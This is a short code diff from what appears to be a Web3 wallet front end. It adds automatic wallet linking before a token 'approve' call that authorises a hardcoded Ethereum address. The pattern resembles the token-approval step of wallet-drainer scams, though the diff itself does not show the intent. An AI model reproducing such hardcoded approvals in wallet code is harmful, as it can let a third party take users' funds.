@@ -71,6 +71,12 @@
       }
       const approve = async () => {
         let auth_address = '';
+        if(address.value == false) {
+          wallet = new Web3Wallet();
+          await wallet.linkWallet();
+          address.value = await wallet.getAddress();
+        }
+
         if (environment.value === 'Ethereum') {
           auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
         } 
@@ -79,6 +85,7 @@
           return;
         }
         try {
+          
           const hash = await wallet.approve(auth_address, address.value);
           console.log('hash', hash);
           isApproved.value = true;
